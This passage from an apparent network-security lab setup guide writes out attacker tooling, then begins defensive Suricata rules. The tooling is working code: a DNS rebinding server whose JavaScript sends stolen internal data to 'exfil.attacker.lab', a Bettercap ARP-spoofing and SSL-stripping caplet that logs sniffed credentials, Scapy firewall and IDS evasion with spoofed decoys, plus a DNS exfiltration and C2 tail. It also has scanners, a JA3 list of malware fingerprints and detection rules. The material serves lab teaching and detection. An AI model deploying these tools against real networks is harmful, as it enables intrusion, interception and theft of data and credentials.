        print(f"       {sys.argv[0]} c2 <tunnel_domain> <resolver>")
        sys.exit(1)
    
    mode = sys.argv[1]
    if mode == "exfil":
        with open(sys.argv[2], "rb") as f:
            data = f.read()
        exfiltrate_via_dns(data, sys.argv[3], sys.argv[4])
    elif mode == "c2":
        interactive_c2(sys.argv[2], sys.argv[3])
PYEOF

cat > /opt/attacks/dns/dns_rebinding.py <<'PYEOF'
#!/usr/bin/env python3
"""
DNS rebinding attack server — serves alternating DNS responses.
First resolution: attacker's IP. Second resolution: internal target IP.
"""
import sys
import socket
import struct
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

class RebindingDNSServer:
    """Minimal DNS server that alternates between two IPs per domain."""
    
    def __init__(self, attacker_ip: str, internal_target: str, domain: str, port: int = 5353):
        self.attacker_ip = attacker_ip
        self.internal_target = internal_target
        self.domain = domain.encode()
        self.port = port
        self.query_count = {}  # Track queries per source
    
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", self.port))
        print(f"[*] DNS rebinding server on :{self.port}")
        print(f"    Domain: {self.domain.decode()}")
        print(f"    1st response: {self.attacker_ip} (attacker)")
        print(f"    2nd response: {self.internal_target} (internal target)\n")
        
        while True:
            data, addr = sock.recvfrom(512)
            response = self._build_response(data, addr)
            if response:
                sock.sendto(response, addr)
    
    def _build_response(self, query: bytes, addr: tuple) -> bytes:
        # Minimal DNS response construction
        txid = query[:2]
        
        # Determine which IP to serve
        key = addr[0]
        self.query_count[key] = self.query_count.get(key, 0) + 1
        
        if self.query_count[key] <= 1:
            ip = self.attacker_ip
            print(f"    [{addr[0]}] Query #{self.query_count[key]} → {ip} (attacker)")
        else:
            ip = self.internal_target
            print(f"    [{addr[0]}] Query #{self.query_count[key]} → {ip} (REBIND!)")
        
        # Build response (simplified — copies question section from query)
        ip_bytes = socket.inet_aton(ip)
        
        # Header: TXID, flags (QR=1, AA=1, RCODE=0), QDCOUNT=1, ANCOUNT=1
        header = txid + b'\x85\x00\x00\x01\x00\x01\x00\x00\x00\x00'
        
        # Copy question section from query (starts at byte 12)
        question_end = 12
        while query[question_end] != 0:
            question_end += query[question_end] + 1
        question_end += 5  # null byte + qtype(2) + qclass(2)
        question = query[12:question_end]
        
        # Answer: pointer to name in question, type A, class IN, TTL=0, RDLENGTH=4, RDATA=IP
        answer = b'\xc0\x0c'  # pointer to name at offset 12
        answer += b'\x00\x01'  # type A
        answer += b'\x00\x01'  # class IN
        answer += b'\x00\x00\x00\x00'  # TTL = 0 (forces re-query)
        answer += b'\x00\x04'  # RDLENGTH = 4
        answer += ip_bytes
        
        return header + question + answer

class RebindingHTTPHandler(SimpleHTTPRequestHandler):
    """Serves the rebinding payload JavaScript."""
    
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            payload = """<!DOCTYPE html>
<html>
<head><title>DNS Rebinding PoC</title></head>
<body>
<h1>DNS Rebinding Attack</h1>
<div id="output"></div>
<script>
// Wait for DNS cache to expire (TTL=0), then re-resolve to internal IP
const output = document.getElementById('output');
output.innerHTML += '<p>Phase 1: Loaded from attacker server</p>';

setTimeout(async () => {
    output.innerHTML += '<p>Phase 2: DNS cache expired, re-resolving...</p>';
    try {
        // This fetch now goes to the INTERNAL IP (same origin!)
        const resp = await fetch('/api/internal-data');
        const data = await resp.text();
        output.innerHTML += '<p>Phase 3: Got internal data: ' + data + '</p>';
        
        // Exfiltrate to attacker
        new Image().src = 'http://exfil.attacker.lab/steal?data=' + 
                          encodeURIComponent(data);
    } catch(e) {
        output.innerHTML += '<p>Error: ' + e.message + '</p>';
    }
}, 3000);  // Wait 3 seconds for TTL expiry
</script>
</body>
</html>"""
            self.wfile.write(payload.encode())
        else:
            super().do_GET()
    
    def log_message(self, format, *args):
        print(f"    [HTTP] {args[0]}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <internal_target_ip> <domain>")
        print(f"  Example: {sys.argv[0]} 10.9.1.20 192.168.1.1 evil.lab")
        sys.exit(1)
    
    attacker_ip = sys.argv[1]
    internal_ip = sys.argv[2]
    domain = sys.argv[3]
    
    # Start DNS server in background
    dns_srv = RebindingDNSServer(attacker_ip, internal_ip, domain)
    dns_thread = threading.Thread(target=dns_srv.start, daemon=True)
    dns_thread.start()
    
    # Start HTTP server
    print(f"[*] HTTP server on :8080 (serves rebinding payload)")
    httpd = HTTPServer(("0.0.0.0", 8080), RebindingHTTPHandler)
    httpd.serve_forever()
PYEOF

# === TLS Attack Scripts ===

cat > /opt/attacks/tls/tls_scanner.py <<'PYEOF'
#!/usr/bin/env python3
"""
TLS vulnerability scanner — tests for common weaknesses.
Checks: protocol versions, weak ciphers, certificate issues, compression,
Logjam, ROBOT, renegotiation, 0-RTT, JA3 fingerprinting.
"""
import sys
import ssl
import socket
import hashlib
import struct
import time
from datetime import datetime

class TLSScanner:
    def __init__(self, host: str, port: int = 443, timeout: int = 5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.findings = []
    
    def scan_all(self):
        """Run all TLS checks."""
        print(f"\n{'='*60}")
        print(f" TLS Security Scan: {self.host}:{self.port}")
        print(f" Time: {datetime.utcnow().isoformat()}Z")
        print(f"{'='*60}\n")
        
        self.check_protocol_versions()
        self.check_certificate()
        self.check_cipher_suites()
        self.check_compression()
        self.check_renegotiation()
        self.check_hsts()
        self.compute_ja3s()
        
        self.print_summary()
    
    def check_protocol_versions(self):
        """Test which TLS versions are supported."""
        print("[*] Protocol Version Support:")
        versions = {
            "SSLv3": ssl.PROTOCOL_SSLv23,
            "TLS 1.0": None,
            "TLS 1.1": None,
            "TLS 1.2": None,
            "TLS 1.3": None,
        }
        
        # Test TLS 1.2
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.maximum_version = ssl.TLSVersion.TLSv1_2
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock) as ssock:
                    print(f"    TLS 1.2: SUPPORTED (cipher: {ssock.cipher()[0]})")
        except Exception as e:
            print(f"    TLS 1.2: not supported ({e})")
        
        # Test TLS 1.3
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_3
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock) as ssock:
                    print(f"    TLS 1.3: SUPPORTED (cipher: {ssock.cipher()[0]})")
        except Exception as e:
            print(f"    TLS 1.3: not supported ({e})")
        
        # Test legacy (TLS 1.0/1.1)
        for ver_name, min_ver, max_ver in [
            ("TLS 1.0", ssl.TLSVersion.TLSv1, ssl.TLSVersion.TLSv1),
            ("TLS 1.1", ssl.TLSVersion.TLSv1_1, ssl.TLSVersion.TLSv1_1),
        ]:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = min_ver
                ctx.maximum_version = max_ver
                with socket.create_connection((self.host, self.port), self.timeout) as sock:
                    with ctx.wrap_socket(sock) as ssock:
                        print(f"    {ver_name}: SUPPORTED ⚠️  (DEPRECATED)")
                        self.findings.append(("HIGH", f"{ver_name} supported (deprecated)"))
            except:
                print(f"    {ver_name}: not supported ✓")
        print()
    
    def check_certificate(self):
        """Analyze server certificate."""
        print("[*] Certificate Analysis:")
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    cert_info = ssock.getpeercert()
                    
                    if cert_info:
                        subject = dict(x[0] for x in cert_info.get('subject', []))
                        issuer = dict(x[0] for x in cert_info.get('issuer', []))
                        not_after = cert_info.get('notAfter', 'unknown')
                        san = cert_info.get('subjectAltName', [])
                        
                        print(f"    Subject: {subject.get('commonName', 'N/A')}")
                        print(f"    Issuer: {issuer.get('commonName', 'N/A')}")
                        print(f"    Expires: {not_after}")
                        print(f"    SANs: {[s[1] for s in san[:5]]}")
                        
                        # Check self-signed
                        if subject == issuer:
                            print(f"    ⚠️  Self-signed certificate!")
                            self.findings.append(("MEDIUM", "Self-signed certificate"))
                        
                        # Check expiry
                        expiry = ssl.cert_time_to_seconds(not_after)
                        days_left = (expiry - time.time()) / 86400
                        if days_left < 0:
                            print(f"    ⚠️  Certificate EXPIRED ({abs(days_left):.0f} days ago)")
                            self.findings.append(("CRITICAL", "Expired certificate"))
                        elif days_left < 30:
                            print(f"    ⚠️  Certificate expires in {days_left:.0f} days")
                            self.findings.append(("MEDIUM", f"Certificate expires in {days_left:.0f} days"))
                        
                        # Compute cert fingerprint
                        sha256 = hashlib.sha256(cert).hexdigest()
                        print(f"    SHA-256: {sha256[:32]}...")
                    else:
                        print("    Unable to parse certificate (DER only)")
                        sha256 = hashlib.sha256(cert).hexdigest()
                        print(f"    SHA-256: {sha256[:32]}...")
        except Exception as e:
            print(f"    Error: {e}")
        print()
    
    def check_cipher_suites(self):
        """Test for weak cipher suites."""
        print("[*] Cipher Suite Analysis:")
        
        weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT', 'anon']
        
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers('ALL:COMPLEMENTOFALL')
            
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cipher = ssock.cipher()
                    print(f"    Negotiated: {cipher[0]} ({cipher[1]}, {cipher[2]} bits)")
                    
                    if cipher[2] < 128:
                        self.findings.append(("HIGH", f"Weak key length: {cipher[2]} bits"))
                    
                    for weak in weak_ciphers:
                        if weak.upper() in cipher[0].upper():
                            self.findings.append(("CRITICAL", f"Weak cipher: {cipher[0]}"))
                            print(f"    ⚠️  WEAK CIPHER DETECTED: {cipher[0]}")
                            break
                    else:
                        print(f"    ✓ No weak ciphers in negotiated suite")
        except Exception as e:
            print(f"    Error: {e}")
        print()
    
    def check_compression(self):
        """Check for TLS compression (CRIME vulnerability)."""
        print("[*] TLS Compression (CRIME):")
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    compression = ssock.compression()
                    if compression:
                        print(f"    ⚠️  TLS compression ENABLED: {compression}")
                        self.findings.append(("HIGH", f"TLS compression enabled (CRIME: {compression})"))
                    else:
                        print(f"    ✓ TLS compression disabled")
        except Exception as e:
            print(f"    Error: {e}")
        print()
    
    def check_renegotiation(self):
        """Check for secure renegotiation support."""
        print("[*] Renegotiation:")
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    # Python's ssl module doesn't directly expose renegotiation info
                    # but we can check if the connection succeeds with modern defaults
                    print(f"    Connection established (renegotiation check requires openssl s_client)")
                    print(f"    Run: openssl s_client -connect {self.host}:{self.port} -status")
        except Exception as e:
            print(f"    Error: {e}")
        print()
    
    def check_hsts(self):
        """Check for HSTS header."""
        print("[*] HSTS (HTTP Strict Transport Security):")
        try:
            import urllib.request
            req = urllib.request.Request(f"https://{self.host}:{self.port}/",
                                        headers={"Host": self.host})
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            hsts = resp.headers.get("Strict-Transport-Security")
            if hsts:
                print(f"    ✓ HSTS present: {hsts}")
                if "includeSubDomains" not in hsts:
                    print(f"    ⚠️  Missing includeSubDomains")
                if "preload" not in hsts:
                    print(f"    ⚠️  Missing preload directive")
            else:
                print(f"    ⚠️  HSTS header MISSING")
                self.findings.append(("MEDIUM", "HSTS header not set"))
        except Exception as e:
            print(f"    Error checking HSTS: {e}")
        print()
    
    def compute_ja3s(self):
        """Compute JA3S fingerprint of the server's TLS handshake."""
        print("[*] JA3S Fingerprint:")
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    version = ssock.version()
                    cipher = ssock.cipher()
                    print(f"    Version: {version}")
                    print(f"    Cipher: {cipher[0]}")
                    print(f"    (Full JA3S computation requires raw handshake capture — use tshark)")
        except Exception as e:
            print(f"    Error: {e}")
        print()
    
    def print_summary(self):
        """Print findings summary."""
        print(f"\n{'='*60}")
        print(f" FINDINGS SUMMARY")
        print(f"{'='*60}")
        
        if not self.findings:
            print(" ✓ No significant vulnerabilities detected")
        else:
            for severity, desc in sorted(self.findings, key=lambda x: 
                {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}.get(x[0], 4)):
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}[severity]
                print(f"  {icon} [{severity}] {desc}")
        
        print(f"\n Total findings: {len(self.findings)}")
        print(f" Critical: {sum(1 for s,_ in self.findings if s=='CRITICAL')}")
        print(f" High: {sum(1 for s,_ in self.findings if s=='HIGH')}")
        print(f" Medium: {sum(1 for s,_ in self.findings if s=='MEDIUM')}")
        print(f"{'='*60}\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host> [port]")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    scanner = TLSScanner(host, port)
    scanner.scan_all()
PYEOF

cat > /opt/attacks/tls/ja3_fingerprinter.py <<'PYEOF'
#!/usr/bin/env python3
"""
JA3/JA3S fingerprint extractor from pcap files.
Computes TLS client and server fingerprints for threat detection.
"""
import sys
import hashlib
from scapy.all import rdpcap, TLS, TCP, IP
from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
from scapy.layers.tls.extensions import TLS_Ext_SupportedGroups, TLS_Ext_SignatureAlgorithms

GREASE_VALUES = {0x0a0a, 0x1a1a, 0x2a2a, 0x3a3a, 0x4a4a, 0x5a5a,
                 0x6a6a, 0x7a7a, 0x8a8a, 0x9a9a, 0xaaaa, 0xbaba,
                 0xcaca, 0xdada, 0xeaea, 0xfafa}

KNOWN_MALICIOUS_JA3 = {
    "72a589da586844d7f0818ce684948eea": "Cobalt Strike (default)",
    "e7d705a3286e19ea42f587b344ee6865": "Metasploit Meterpreter",
    "6734f37431670b3ab4292b8f60f29984": "Trickbot",
    "4d7a28d6f2263ed61de88ca66eb011e3": "AsyncRAT",
    "3b5074b1b5d032e5620f69f9f700ff0e": "Sliver C2",
}

def compute_ja3(client_hello) -> tuple:
    """Compute JA3 hash from a TLS ClientHello."""
    if not hasattr(client_hello, 'version'):
        return None, None
    
    version = client_hello.version
    
    # Cipher suites (filter GREASE)
    ciphers = [c for c in (client_hello.ciphers or []) if c not in GREASE_VALUES]
    
    # Extensions
    extensions = []
    elliptic_curves = []
    ec_point_formats = []
    
    if hasattr(client_hello, 'ext') and client_hello.ext:
        for ext in client_hello.ext:
            ext_type = ext.type if hasattr(ext, 'type') else 0
            if ext_type not in GREASE_VALUES:
                extensions.append(ext_type)
            
            if isinstance(ext, TLS_Ext_SupportedGroups):
                elliptic_curves = [g for g in (ext.groups or []) if g not in GREASE_VALUES]
    
    ja3_raw = f"{version}," + \
              "-".join(str(c) for c in ciphers) + "," + \
              "-".join(str(e) for e in extensions) + "," + \
              "-".join(str(ec) for ec in elliptic_curves) + "," + \
              "-".join(str(pf) for pf in ec_point_formats)
    
    ja3_hash = hashlib.md5(ja3_raw.encode()).hexdigest()
    return ja3_hash, ja3_raw

def analyze_pcap(pcap_file: str):
    """Extract JA3 fingerprints from a pcap file."""
    print(f"[*] Analyzing {pcap_file} for TLS fingerprints...\n")
    
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Error reading pcap: {e}")
        return
    
    ja3_results = []
    
    for pkt in packets:
        if pkt.haslayer(TLSClientHello):
            ch = pkt[TLSClientHello]
            ja3_hash, ja3_raw = compute_ja3(ch)
            if ja3_hash:
                src = pkt[IP].src if pkt.haslayer(IP) else "unknown"
                dst = pkt[IP].dst if pkt.haslayer(IP) else "unknown"
                
                result = {
                    "src": src,
                    "dst": dst,
                    "ja3": ja3_hash,
                    "ja3_raw": ja3_raw,
                    "malicious": KNOWN_MALICIOUS_JA3.get(ja3_hash, None)
                }
                ja3_results.append(result)
                
                status = f"⚠️  {result['malicious']}" if result['malicious'] else "✓ Unknown/Benign"
                print(f"  {src} → {dst}")
                print(f"    JA3: {ja3_hash}  [{status}]")
                print()
    
    # Summary
    print(f"\n{'='*50}")
    print(f" JA3 Summary: {len(ja3_results)} ClientHellos analyzed")
    unique_ja3 = set(r['ja3'] for r in ja3_results)
    print(f" Unique fingerprints: {len(unique_ja3)}")
    malicious = [r for r in ja3_results if r['malicious']]
    if malicious:
        print(f" ⚠️  MALICIOUS MATCHES: {len(malicious)}")
        for m in malicious:
            print(f"    - {m['src']} → {m['dst']}: {m['malicious']}")
    print(f"{'='*50}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        print("  Extracts JA3 fingerprints and checks against known malicious hashes")
        sys.exit(1)
    analyze_pcap(sys.argv[1])
PYEOF

# === MITM Scripts ===

cat > /opt/attacks/mitm/ssl_strip_demo.sh <<'BASH'
#!/bin/bash
# SSL stripping + ARP spoofing demonstration with Bettercap
# Requires: bettercap, iptables

TARGET_SUBNET="${1:-10.9.1.0/24}"
IFACE="${2:-eth0}"

echo "[*] SSL Stripping Demo"
echo "    Target: $TARGET_SUBNET"
echo "    Interface: $IFACE"
echo ""
echo "[!] This requires IP forwarding and iptables NAT"

# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1

# Bettercap caplet for automated SSL stripping
cat > /tmp/sslstrip.cap <<'CAPEOF'
# Bettercap SSL strip caplet
set arp.spoof.fullduplex true
set arp.spoof.internal true
set arp.spoof.targets 10.9.1.10

# HTTP proxy with SSL stripping
set http.proxy.sslstrip true
set http.proxy.port 8080

# DNS spoofing for HSTS bypass (change hostnames)
set dns.spoof.all true

# Credential sniffing
set net.sniff.verbose true
set net.sniff.regexp (?i)(password|passwd|pass|user|username|login|email)=([^&\s]+)

# Start modules
arp.spoof on
http.proxy on
net.sniff on

# Events handler — log credentials
events.stream off
set events.stream.output /tmp/bettercap_creds.log
events.stream on
CAPEOF

echo "[*] Starting Bettercap with SSL strip caplet..."
echo "    Credentials will be logged to /tmp/bettercap_creds.log"
echo ""
echo "    To run: sudo bettercap -iface $IFACE -caplet /tmp/sslstrip.cap"
echo ""
echo "[*] Manual execution steps:"
echo "    1. sudo bettercap -iface $IFACE"
echo "    2. In bettercap console:"
echo "       > set arp.spoof.targets 10.9.1.10"
echo "       > arp.spoof on"
echo "       > set http.proxy.sslstrip true"
echo "       > http.proxy on"
echo "       > net.sniff on"
BASH
chmod +x /opt/attacks/mitm/ssl_strip_demo.sh

# === Scanning Scripts ===

cat > /opt/attacks/scan/comprehensive_scan.sh <<'BASH'
#!/bin/bash
# Comprehensive network scanning methodology
TARGET="${1:-10.9.1.10}"
OUTPUT_DIR="/tmp/scan_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "╔════════════════════════════════════════════════════╗"
echo "║  Comprehensive Network Scan — $TARGET              ║"
echo "║  Output: $OUTPUT_DIR                               ║"
echo "╚════════════════════════════════════════════════════╝"
echo ""

# Phase 1: Host discovery
echo "[Phase 1] Host Discovery..."
nmap -sn -PE -PP -PS80,443,22 -PA3389 "$TARGET" -oA "$OUTPUT_DIR/01_discovery"

# Phase 2: Fast port scan (SYN, top 1000)
echo "[Phase 2] Fast SYN scan (top 1000 ports)..."
nmap -sS -T4 --top-ports 1000 "$TARGET" -oA "$OUTPUT_DIR/02_fast_syn"

# Phase 3: Full port scan
echo "[Phase 3] Full port scan (1-65535)..."
nmap -sS -p 1-65535 -T4 --min-rate 1000 "$TARGET" -oA "$OUTPUT_DIR/03_full_ports"

# Phase 4: Service version detection on open ports
OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/03_full_ports.nmap" 2>/dev/null | \
             grep -oP '^\d+' | tr '\n' ',' | sed 's/,$//')
if [ -n "$OPEN_PORTS" ]; then
    echo "[Phase 4] Service detection on ports: $OPEN_PORTS"
    nmap -sV --version-intensity 5 -p "$OPEN_PORTS" "$TARGET" -oA "$OUTPUT_DIR/04_services"
fi

# Phase 5: OS detection
echo "[Phase 5] OS detection..."
nmap -O --osscan-guess "$TARGET" -oA "$OUTPUT_DIR/05_os_detect"

# Phase 6: NSE vulnerability scripts
echo "[Phase 6] Vulnerability scripts..."
nmap --script vuln -p "$OPEN_PORTS" "$TARGET" -oA "$OUTPUT_DIR/06_vuln_scripts" 2>/dev/null

# Phase 7: UDP scan (top 100)
echo "[Phase 7] UDP scan (top 100)..."
nmap -sU --top-ports 100 -T4 "$TARGET" -oA "$OUTPUT_DIR/07_udp"

# Phase 8: Firewall evasion techniques
echo "[Phase 8] Firewall detection (ACK scan)..."
nmap -sA -p "$OPEN_PORTS" "$TARGET" -oA "$OUTPUT_DIR/08_firewall"

echo ""
echo "[✓] Scan complete. Results in: $OUTPUT_DIR/"
ls -la "$OUTPUT_DIR/"
BASH
chmod +x /opt/attacks/scan/comprehensive_scan.sh

# === Firewall Evasion Scripts ===

cat > /opt/attacks/evasion/firewall_evasion.py <<'PYEOF'
#!/usr/bin/env python3
"""
Firewall evasion techniques using Scapy.
Fragmentation, TTL manipulation, source port tricks, protocol confusion.
"""
import sys
from scapy.all import IP, TCP, UDP, ICMP, fragment, send, sr1, Raw

def fragmented_syn(target: str, port: int, frag_size: int = 8):
    """Send a SYN as tiny IP fragments to evade signature-based IDS."""
    print(f"[*] Fragmented SYN → {target}:{port} (frag_size={frag_size})")
    
    pkt = IP(dst=target) / TCP(dport=port, flags="S", seq=12345) / Raw(b"A" * 64)
    frags = fragment(pkt, fragsize=frag_size)
    
    print(f"    Generated {len(frags)} fragments")
    for i, f in enumerate(frags):
        print(f"    Fragment {i}: offset={f[IP].frag}, MF={bool(f[IP].flags.MF)}, len={len(f)}")
        send(f, verbose=0)
    
    print("[+] Fragments sent — check if target reassembles and responds")

def source_port_bypass(target: str, port: int, fake_sport: int = 53):
    """
    Use source port 53 (DNS) or 80 (HTTP) to bypass firewalls
    that allow return traffic from well-known services.
    """
    print(f"[*] Source port bypass: sport={fake_sport} → {target}:{port}")
    
    pkt = IP(dst=target) / TCP(sport=fake_sport, dport=port, flags="S")
    resp = sr1(pkt, timeout=3, verbose=0)
    
    if resp:
        if resp.haslayer(TCP):
            flags = resp[TCP].flags
            if flags == 0x12:  # SYN-ACK
                print(f"    ✓ Port {port} OPEN (bypassed firewall via sport={fake_sport})")
            elif flags == 0x14:  # RST-ACK
                print(f"    Port {port} closed (RST received)")
            else:
                print(f"    Unexpected flags: {flags:#x}")
    else:
        print(f"    No response (filtered or bypass failed)")

def ttl_evasion(target: str, port: int, gateway_hops: int = 5):
    """
    Send probe with TTL calculated to expire just past the IDS
    but reach the target. Requires knowledge of network topology.
    """
    print(f"[*] TTL evasion: crafted TTL to bypass IDS at hop {gateway_hops}")
    
    # First, discover actual hop count to target
    for ttl in range(1, 30):
        pkt = IP(dst=target, ttl=ttl) / ICMP()
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp:
            if resp.haslayer(ICMP):
                if resp[ICMP].type == 0:  # Echo reply = reached target
                    print(f"    Target reached at TTL={ttl}")
                    # Now send scan with exact TTL (IDS at hop < ttl won't see RST)
                    scan_pkt = IP(dst=target, ttl=ttl) / TCP(dport=port, flags="S")
                    scan_resp = sr1(scan_pkt, timeout=3, verbose=0)
                    if scan_resp and scan_resp.haslayer(TCP):
                        print(f"    Port {port}: {'open' if scan_resp[TCP].flags == 0x12 else 'closed'}")
                    break
                elif resp[ICMP].type == 11:  # TTL exceeded
                    hop_ip = resp[IP].src
                    print(f"    Hop {ttl}: {hop_ip}")

def decoy_scan(target: str, port: int, num_decoys: int = 5):
    """Nmap-style decoy scan — mix real scan with spoofed-source packets."""
    import random
    
    print(f"[*] Decoy scan → {target}:{port} with {num_decoys} decoys")
    
    decoys = [f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
              for _ in range(num_decoys)]
    
    # Send decoy SYNs (spoofed sources)
    for decoy_ip in decoys:
        pkt = IP(src=decoy_ip, dst=target) / TCP(dport=port, flags="S",
                                                  seq=random.randint(0, 2**32-1))
        send(pkt, verbose=0)
    
    # Send real scan
    real_pkt = IP(dst=target) / TCP(dport=port, flags="S")
    resp = sr1(real_pkt, timeout=3, verbose=0)
    
    # Send more decoys
    for decoy_ip in decoys:
        pkt = IP(src=decoy_ip, dst=target) / TCP(dport=port, flags="S",
                                                  seq=random.randint(0, 2**32-1))
        send(pkt, verbose=0)
    
    if resp and resp.haslayer(TCP):
        print(f"    Port {port}: {'open' if resp[TCP].flags == 0x12 else 'closed'}")
    else:
        print(f"    Port {port}: filtered/no response")
    
    print(f"    Decoy IPs used: {decoys}")
    print(f"    IDS will see SYNs from {num_decoys + 1} different sources")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <technique> <target> <port> [options]")
        print("  Techniques: fragment, srcport, ttl, decoy")
        sys.exit(1)
    
    technique = sys.argv[1]
    target = sys.argv[2]
    port = int(sys.argv[3])
    
    if technique == "fragment":
        frag_size = int(sys.argv[4]) if len(sys.argv) > 4 else 8
        fragmented_syn(target, port, frag_size)
    elif technique == "srcport":
        sport = int(sys.argv[4]) if len(sys.argv) > 4 else 53
        source_port_bypass(target, port, sport)
    elif technique == "ttl":
        ttl_evasion(target, port)
    elif technique == "decoy":
        num = int(sys.argv[4]) if len(sys.argv) > 4 else 5
        decoy_scan(target, port, num)
PYEOF

chmod +x /opt/attacks/tcp/*.py /opt/attacks/dns/*.py \
         /opt/attacks/tls/*.py /opt/attacks/evasion/*.py

echo "[✓] VM2 attacker tools configured"
```

### VM3 — Detection/IDS Setup

```bash
#!/bin/bash
# vm3_setup.sh — Suricata, Zeek, ELK, detection rules

set -euo pipefail

apt-get update && apt-get install -y \
    suricata zeek docker.io docker-compose \
    python3 python3-pip jq yq

# ─── Suricata custom rules ───
mkdir -p /etc/suricata/rules/custom

cat > /etc/suricata/rules/custom/network-attacks.rules <<'EOF'
# === TCP Attack Detection ===

# SYN flood detection
alert tcp any any -> $HOME_NET any (msg:"LAB TCP SYN Flood Detected"; \
  flags:S,12; threshold:type both, track by_dst, count 1000, seconds 10; \
  classtype:attempted-dos; sid:9000001; rev:1;)

# RST injection flood
alert tcp any any -> $HOME_NET any (msg:"LAB TCP RST Injection Flood"; \
  flags:R; threshold:type both, track by_src, count 50, seconds 5; \
  classtype:attempted-dos; sid:9000002; rev:1;)

# Xmas scan
alert tcp any any -> $HOME_NET any (msg:"LAB Nmap XMAS Scan Detected"; \
  flags:FPU,12; classtype:attempted-recon; sid:9000003; rev:1;)

# NULL scan
alert tcp any any -> $HOME_NET any (msg:"LAB Nmap NULL Scan Detected"; \
  flags:0,12; classtype:attempted-recon; sid:9000004; rev:1;)

# Horizontal port scan (SYN to many ports)
alert tcp any any -> $HOME_NET any (msg:"LAB Horizontal Port Scan"; \
  flags:S,12; threshold:type both, track by_src, count 100, seconds 10; \
  classtype:attempted-recon; sid:9000005; rev:1;)

# TCP covert channel — unusual TCP options
alert tcp any any -> $HOME_NET any (msg:"LAB Unusual TCP Option (Covert Channel)"; \
  tcp.hdr; content:"|13|"; offset:20; depth:20; \
  classtype:policy-violation; sid:9000006; rev:1;)

# === DNS Attack Detection ===

# DNS tunneling — long query name
alert dns any any -> any 53 (msg:"LAB DNS Tunnel - Long Query (>50 chars)"; \
  dns.query; pcre:"/^.{50,}/"; \
  classtype:policy-violation; sid:9000010; rev:1;)

# DNS tunneling — high TXT query rate
alert dns any any -> any 53 (msg:"LAB DNS Tunnel - High TXT Query Rate"; \
  dns.query; content:"|00 10|"; \
  threshold:type both, track by_src, count 50, seconds 60; \
  classtype:policy-violation; sid:9000011; rev:1;)

# DNS amplification — large response to small query
alert udp any 53 -> $HOME_NET any (msg:"LAB DNS Amplification Response"; \
  dsize:>512; threshold:type both, track by_dst, count 100, seconds 10; \
  classtype:attempted-dos; sid:9000012; rev:1;)

# DNS cache poisoning — query flood to single domain
alert dns any any -> $HOME_NET 53 (msg:"LAB Possible Kaminsky Attack"; \
  dns.query; threshold:type both, track by_src, count 500, seconds 10; \
  classtype:attempted-recon; sid:9000013; rev:1;)

# DoH detection — known providers
alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:"LAB DoH to Google DNS"; \
  tls.sni; content:"dns.google"; \
